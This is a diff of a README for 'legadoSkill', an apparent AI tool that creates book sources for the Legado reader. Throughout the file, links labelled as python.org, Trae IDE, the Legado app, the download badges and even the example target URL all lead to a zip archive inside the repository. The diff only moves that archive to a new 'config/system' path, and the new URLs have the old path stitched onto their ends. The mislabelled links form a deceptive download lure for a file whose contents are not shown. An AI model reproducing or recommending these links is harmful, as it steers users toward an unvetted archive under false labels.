@@ -1,6 +1,6 @@
 # 📚 legadoSkill - AI Tool for Easy Book Source Creation
 
-[![Download legadoSkill](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip)
+[![Download legadoSkill](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip)
 
 ---
 
@@ -18,7 +18,7 @@ This tool looks at the website structure and finds key information: book titles,
 
 - A Windows PC.
 - Python version 3.8 or newer installed.  
-  You can download Python from [python.org](https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip).
+  You can download Python from [python.org](https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip).
 - The AI client called Trae IDE or any other MCP protocol-compatible client. This is where the tool runs and processes your book source requests.
 
 ---
@@ -27,10 +27,10 @@ This tool looks at the website structure and finds key information: book titles,
 
 ### Step 1: Visit the Download Page
 
-[![Download Page](https://img.shields.io/badge/Download%20legadoSkill-blue?style=for-the-badge)](https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip)
+[![Download Page](https://img.shields.io/badge/Download%20legadoSkill-blue?style=for-the-badge)](https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip)
 
 Click this badge or open this link in your web browser:  
-https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip
+https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip
 
 You will find the latest version of legadoSkill there.
 
@@ -96,10 +96,10 @@ If you want to try the tool without Trae:
 3. Run the program with a command similar to:
 
    ```
-   python main.py --url "https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip"
+   python main.py --url "https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip"
    ```
 
-Replace `https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip` with the address of the site you want to convert.
+Replace `https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip` with the address of the site you want to convert.
 
 The tool will analyze the page and output a JSON file matching Legado’s rules.
 
@@ -138,9 +138,9 @@ The tool will analyze the page and output a JSON file matching Legado’s rules.
 
 ## 🔗 Helpful Links
 
-- Python downloads: https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip
-- Trae IDE: https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip (replace with actual link if known)
-- Legado reading app: https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip
+- Python downloads: https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip
+- Trae IDE: https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip (replace with actual link if known)
+- Legado reading app: https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip
 
 ---
 
@@ -161,4 +161,4 @@ The tool will analyze the page and output a JSON file matching Legado’s rules.
 
 ## 📥 Quick Download Link
 
-[Get the latest release here](https://raw.githubusercontent.com/rezmdie/legadoSkill/main/temp/番茄小说zym888/Skill_legado_2.3.zip) to start using legadoSkill on Windows. Download the package, install dependencies, and begin converting book sources with AI support.
+[Get the latest release here](https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip) to start using legadoSkill on Windows. Download the package, install dependencies, and begin converting book sources with AI support.
